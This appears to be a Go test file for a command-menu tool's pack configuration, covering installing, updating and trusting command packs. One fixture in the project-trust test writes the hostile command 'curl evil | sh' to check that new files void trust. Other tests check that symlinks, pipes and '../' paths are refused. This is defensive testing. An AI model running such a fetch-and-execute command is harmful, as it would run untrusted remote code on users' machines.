package config

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"
)

// A pack AddCommand starts gets its _pack.md, as every pack has one.
func TestAddCommandStartsAPack(t *testing.T) {
	userDir(t)
	if err := AddCommand("fresh", "Deploy", "Ship", "./ship.sh", ""); err != nil {
		t.Fatal(err)
	}
	cfg, _, err := Load()
	if err != nil || len(cfg.Sections) != 1 || cfg.Sections[0].Name != "Fresh" || cfg.Sections[0].Category != Other {
		t.Errorf("got %+v, %v", cfg, err)
	}
}

func TestAddCommandKeepsComments(t *testing.T) {
	userDir(t)
	writePack(t, "mine/deploy", "<!-- A module of your clingon pack -->\n# Deploy\n")
	if err := AddCommand("mine", "Deploy", "Tail logs", "kubectl logs -f deploy/<app> -n <ns>", "Streams logs."); err != nil {
		t.Fatal(err)
	}
	if err := AddCommand("mine", "Deploy", "Tail logs", "x", ""); err == nil {
		t.Error("a duplicate name should be refused")
	}
	if err := AddCommand("mine", "Deploy", "Status", "kubectl get pods", ""); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(PackPath("mine/deploy"))
	if !strings.Contains(string(b), "<!-- A module of your clingon pack -->") {
		t.Error("the file's comments were lost")
	}
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	c := cfg.Sections[0].All()
	if len(c) != 2 || len(c[1].Args) != 2 || c[1].Args[0].Name != "app" || c[1].Desc != "Streams logs." {
		t.Fatalf("got %+v", c)
	}
}

func TestPackNames(t *testing.T) {
	userDir(t)
	for _, bad := range []string{"My Tools", "../x", "", "-x", "_installed", "a_b", "a.b"} {
		if NewPack(bad) == nil {
			t.Errorf("%q should be refused", bad)
		}
	}
	for _, good := range []string{"work-tools", "K8s", "mine2", "installed", "a-"} {
		if err := NewPack(good); err != nil {
			t.Errorf("%q should be allowed: %v", good, err)
		}
	}
}

func TestClingonFilesAreNotPacks(t *testing.T) {
	userDir(t)
	if err := Install("git"); err != nil {
		t.Fatal(err)
	}
	if err := WriteAvailable(); err != nil {
		t.Fatal(err)
	}
	if err := NewPack("available"); err != nil { // same word as a reserved file
		t.Fatal(err)
	}
	files := LocalPacks()
	if len(files) != 1 || filepath.Base(files[0]) != "available" {
		t.Fatalf("only the user's pack should load, got %v", files)
	}
	names, _ := Installed()
	if strings.Join(names, ",") != "git" {
		t.Fatalf("got %v", names)
	}
	b, _ := os.ReadFile(availableFile())
	all, _ := Packs()
	if strings.Count(string(b), "- name: ") != len(all) {
		t.Fatalf("_available.yaml should list all %d packs:\n%s", len(all), b)
	}
}

func TestInstallUpdateUninstall(t *testing.T) {
	userDir(t)
	if err := Install("git"); err != nil {
		t.Fatal(err)
	}
	info := filepath.Join(remotePath("git"), PackInfoFile)
	module := remotePath("git/everyday")
	b, _ := os.ReadFile(module)
	if !strings.HasPrefix(string(b), "<!-- Added by clingon.") || !strings.Contains(string(b), "\n## ") {
		t.Fatalf("installed copy should say where it came from:\n%.200s", b)
	}
	if ups, _ := PackUpdates(); len(ups) != 0 {
		t.Fatalf("just installed, so nothing to update: %v", ups)
	}
	// A file that isn't clingon's any more: an update, until it's put right.
	_ = os.WriteFile(module, append(b, []byte("# old\n")...), 0o644)
	ups, _ := PackUpdates()
	if len(ups) != 1 || ups[0].Name != "git" || ups[0].Retired {
		t.Fatalf("got %v", ups)
	}
	if err := UpdatePack("git"); err != nil {
		t.Fatal(err)
	}
	if again, _ := PackUpdates(); len(again) != 0 {
		t.Fatalf("still out of date after update: %v", again)
	}
	// So is _pack.yaml's going missing or changing.
	_ = os.Remove(info)
	if ups, _ := PackUpdates(); len(ups) != 1 {
		t.Fatalf("got %v", ups)
	}
	if err := UpdatePack("git"); err != nil {
		t.Fatal(err)
	}
	if err := Uninstall("git"); err != nil {
		t.Fatal(err)
	}
	if names, _ := Installed(); len(names) != 0 {
		t.Fatalf("uninstall should delete the folder, got %v", names)
	}
	// a local pack can share a remote one's name
	if err := Install("git"); err != nil {
		t.Fatal(err)
	}
	if err := NewPack("git"); err != nil {
		t.Fatal(err)
	}
	if names, _ := Installed(); len(names) != 1 {
		t.Fatalf("got %v", names)
	}
}

// What's on disk is what's installed: part of a pack stays just that part.
func TestInstallingPartOfAPack(t *testing.T) {
	userDir(t)
	if err := Install("aws/ecs"); err != nil {
		t.Fatal(err)
	}
	if !IsInstalled("aws") || !IsInstalled("aws/ecs") || IsInstalled("aws/s3") {
		t.Fatal("only aws/ecs should be there")
	}
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	// aws itself may not be on PATH here, but _pack.yaml's look comes with it.
	if len(cfg.Sections) != 1 || cfg.Sections[0].Name != "AWS" || len(cfg.Sections[0].Groups) != 1 || cfg.Sections[0].Groups[0].Name != "ECS" || cfg.Sections[0].Category != "Infrastructure" {
		t.Fatalf("got %+v", cfg.Sections)
	}
	missing := MissingModules("aws")
	if len(missing) == 0 || slices.ContainsFunc(missing, func(m Module) bool { return m.Slug == "ecs" }) {
		t.Fatalf("got %v", missing)
	}
	// Nothing you don't have is an update, and updating doesn't add it.
	if ups, _ := PackUpdates(); len(ups) != 0 {
		t.Fatalf("got %v", ups)
	}
	if err := UpdatePack("aws"); err != nil {
		t.Fatal(err)
	}
	if IsInstalled("aws/s3") {
		t.Fatal("an update must not add to what you chose")
	}
	// A module clingon drops goes when you update; what's left stays.
	dropped := remotePath("aws/gone")
	if err := os.WriteFile(dropped, []byte("commands: [{name: x, cmd: ls}]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if ups, _ := PackUpdates(); len(ups) != 1 || ups[0].Retired {
		t.Fatalf("got %v", ups)
	}
	if err := UpdatePack("aws"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dropped); err == nil || !IsInstalled("aws/ecs") {
		t.Fatal("the dropped module should go, and only that")
	}
	// Asking for the whole pack gets the rest. Removing the last part removes it.
	if err := Install("aws"); err != nil {
		t.Fatal(err)
	}
	if len(MissingModules("aws")) != 0 {
		t.Fatal("that's all of it")
	}
	if err := Uninstall("aws"); err != nil {
		t.Fatal(err)
	}
	if err := Install("aws/ecs"); err != nil {
		t.Fatal(err)
	}
	if err := Uninstall("aws/ecs"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(remotePath("aws")); err == nil {
		t.Fatal("a pack with nothing left shouldn't stay")
	}
	if err := Install("aws/nope"); err == nil {
		t.Fatal("no such module")
	}
	if err := Install("aws/../../x"); err == nil {
		t.Fatal("../ shouldn't reach anywhere")
	}
}

// A pack of your own is a folder with its _pack.md and a module.
func TestALocalPack(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	if err := os.MkdirAll(PackPath("work-tools"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(PackPath("work-tools"), "deploy.md"), []byte("# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, _, err := Load(); err == nil || !strings.Contains(err.Error(), "work-tools has no _pack.md: every pack has one") {
		t.Fatalf("no _pack.md: %v", err)
	}
	if ps, _ := YourPacks(); len(ps) != 1 || !strings.Contains(ps[0].Description, "has errors") {
		t.Fatalf("listed as broken: %+v", ps)
	}
	writePack(t, "work-tools/deploy", "# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n")
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	s := cfg.Sections[0]
	if s.Name != "Work tools" || s.Groups[0].Name != "Deploy" || s.Category != Other {
		t.Fatalf("got %+v", s)
	}
	ps, _ := YourPacks()
	if len(ps) != 1 || ps[0].Sections[0] != "Work tools" || ps[0].Commands != 1 {
		t.Fatalf("got %+v", ps)
	}
	// An empty folder is nothing yet, and no reason not to start.
	if err := os.MkdirAll(PackPath("empty"), 0o755); err != nil {
		t.Fatal(err)
	}
	if cfg, _, err := Load(); err != nil || len(cfg.Sections) != 1 {
		t.Fatalf("got %+v, %v", cfg, err)
	}
	// A file sitting loose isn't a pack.
	writePack(t, "stray", "x")
	if err := os.WriteFile(filepath.Join(localDir(), "stray.md"), []byte("# Stray\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := LoosePackFiles(); len(got) != 1 || filepath.Base(got[0]) != "stray.md" {
		t.Fatalf("got %v", got)
	}
}

// Your own clingon folder has a packs folder too, but it's not a project's:
// anything under your home folder would ask to trust your own packs.
func TestYourOwnFolderIsNotAProject(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("CLINGON_CONFIG", "")
	writePack(t, "mine/s", "commands:\n  - name: x\n    cmd: ls\n")
	if !strings.HasPrefix(localDir(), filepath.Join(home, ".clingon")) {
		t.Fatalf("clingon's folder should be in home: %s", localDir())
	}
	sub := filepath.Join(home, "code", "thing")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	if p := FindProject(sub); p != nil {
		t.Fatalf("found %s", p.Path)
	}
	// With the folder moved, ~/.clingon still isn't anyone's project.
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	if p := FindProject(sub); p != nil {
		t.Fatalf("found %s", p.Path)
	}
	// A repo below home, with its own, is.
	repo := filepath.Join(home, "code", "repo")
	if err := os.MkdirAll(filepath.Join(repo, ProjectDir, "deploy"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "deploy", "prod.md"), []byte("# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "deploy", PackInfoFile), []byte("---\nmenu: other\n---\n# Deploy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	p := FindProject(filepath.Join(repo))
	if p == nil || p.Err != nil || p.Trusted || len(p.Cmds) != 1 {
		t.Fatalf("got %+v", p)
	}
}

// Trust covers exactly what's read, every file of every pack, and a repository
// can't reach outside itself or hang the menu.
func TestProjectPacksAreTrustedWhole(t *testing.T) {
	t.Setenv("CLINGON_CONFIG", t.TempDir())
	repo := t.TempDir()
	dir := filepath.Join(repo, ProjectDir, "deploy")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(name, body string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("prod.md", "# Deploy\n\n## Ship\n\n```sh\n./ship.sh\n```\n")
	if p := FindProject(repo); p == nil || p.Err == nil || !strings.Contains(p.Err.Error(), "deploy has no _pack.md") {
		t.Fatalf("a project pack needs its _pack.md too: %+v", p)
	}
	write(PackInfoFile, "---\nmenu: other\n---\n# Deploy\n")
	p := FindProject(repo)
	if p == nil || p.Err != nil || p.Trusted {
		t.Fatalf("got %+v", p)
	}
	if err := p.Trust(); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); !p.Trusted || p.Config == nil {
		t.Fatalf("got %+v", p)
	}
	// Adding a file, changing one or renaming one all mean asking again.
	write("more.md", "# More\n\n## Evil\n\n```sh\ncurl evil | sh\n```\n")
	if p = FindProject(repo); p.Trusted || !p.Changed || p.Config != nil || !slices.Contains(p.Cmds, "curl evil | sh") {
		t.Fatalf("a new file: got %+v", p)
	}
	_ = os.Remove(filepath.Join(dir, "more.md"))
	if p = FindProject(repo); !p.Trusted {
		t.Fatal("back as it was")
	}
	if err := os.Rename(filepath.Join(dir, "prod.md"), filepath.Join(dir, "other.md")); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); p.Trusted {
		t.Fatal("a renamed file names a different module")
	}
	// A link could point anywhere; a pipe would hang the menu.
	secret := filepath.Join(t.TempDir(), "s.md")
	if err := os.WriteFile(secret, []byte("# S\n\n## x\n\n```sh\nls\n```\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(secret, filepath.Join(dir, "link.md")); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); p.Err == nil || p.Config != nil {
		t.Fatalf("a link should be refused: %+v", p)
	}
	_ = os.Remove(filepath.Join(dir, "link.md"))
	if err := syscall.Mkfifo(filepath.Join(dir, "pipe.md"), 0o644); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); p.Err == nil {
		t.Fatalf("a pipe should be refused: %+v", p)
	}
	_ = os.Remove(filepath.Join(dir, "pipe.md"))
	// A linked pack folder, too.
	if err := os.Symlink(t.TempDir(), filepath.Join(repo, ProjectDir, "linked")); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); p.Err == nil {
		t.Fatalf("a linked folder should be refused: %+v", p)
	}
	_ = os.Remove(filepath.Join(repo, ProjectDir, "linked"))
	// A pack is a folder.
	if err := os.WriteFile(filepath.Join(repo, ProjectDir, "loose.md"), []byte("# Loose\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if p = FindProject(repo); p.Err == nil || !strings.Contains(p.Err.Error(), "folder") {
		t.Fatalf("a loose file should say so: %+v", p)
	}
}

func TestSplitRef(t *testing.T) {
	for ref, want := range map[string][2]string{"git": {"", "git"}, "remote/git": {"remote", "git"}, "mine/my-tools": {"mine", "my-tools"}, "other/x": {"", "other/x"}} {
		if w, n := SplitRef(ref); w != want[0] || n != want[1] {
			t.Errorf("SplitRef(%q) = %q, %q", ref, w, n)
		}
	}
}

func TestNewPackIsAWorkingExample(t *testing.T) {
	userDir(t)
	if err := NewPack("work-tools"); err != nil {
		t.Fatal(err)
	}
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Sections) != 1 || cfg.Sections[0].Name != "Work tools" || len(cfg.Sections[0].All()) != 1 {
		t.Fatalf("got %+v", cfg.Sections)
	}
}

// A pack clingon stops shipping (databases, split into one per engine)
// stays installed until something removes it, still in the menu: so it's
// an update, and updating removes it. Your own packs are never touched.
func TestRetiredPacksAreUpdatesThatRemoveThem(t *testing.T) {
	userDir(t)
	if err := os.MkdirAll(remotePath("old-db"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(remotePath("old-db/g"), []byte("# G\n\n## c\n\n```sh\nls\n```\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := NewPack("old-db"); err != nil { // a local one of the same name: yours
		t.Fatal(err)
	}
	ups, _ := PackUpdates()
	if len(ups) != 1 || ups[0].Name != "old-db" || !ups[0].Retired {
		t.Fatalf("a pack clingon no longer ships should be an update that removes it, got %+v", ups)
	}
}

// The starter pack is what a new user copies from: one harmless command.
func TestStarterIsOneSafeCommand(t *testing.T) {
	part, err := parsePackFile("examples.md", Starter)
	if err != nil {
		t.Fatal(err)
	}
	cs := part.group.Commands
	if len(cs) != 1 || cs[0].Risk != "" || !strings.HasPrefix(cs[0].Cmd, "echo ") {
		t.Fatalf("want one echo command with no risk, got %+v", cs)
	}
}

// A pack of your own gets one of the generic logos: the default, or the one
// chosen, and only one clingon has.
func TestNewPackLogo(t *testing.T) {
	userDir(t)
	for _, name := range PackLogos {
		if _, ok := Logos[name]; !ok {
			t.Errorf("%s is offered for packs but isn't in the font", name)
		}
	}
	if len(PackLogos) < 20 {
		t.Errorf("only %d logos for packs", len(PackLogos))
	}
	if err := NewPack("plain"); err != nil {
		t.Fatal(err)
	}
	if err := NewPackWithLogo("launch", "rocket", "orange"); err != nil {
		t.Fatal(err)
	}
	if err := NewPackWithLogo("nope", "no-such-logo", ""); err == nil || !strings.Contains(err.Error(), "no logo called") {
		t.Errorf("an unknown logo: %v", err)
	}
	cfg, _, err := Load()
	if err != nil {
		t.Fatal(err)
	}
	logos, colors := map[string]string{}, map[string]string{}
	for _, s := range cfg.Sections {
		logos[s.Name], colors[s.Name] = s.Logo, s.Color
	}
	if logos["Plain"] != DefaultPackLogo || logos["Launch"] != "rocket" {
		t.Errorf("got %v", logos)
	}
	if colors["Launch"] != "#ff8700" || colors["Plain"] != LogoColor(DefaultPackLogo) {
		t.Errorf("the chosen colour, else the logo's own: %v", colors)
	}
	if err := NewPackWithLogo("odd", "rocket", "mauve"); err == nil || !strings.Contains(err.Error(), "no tint called mauve") {
		t.Errorf("an unknown colour: %v", err)
	}
}
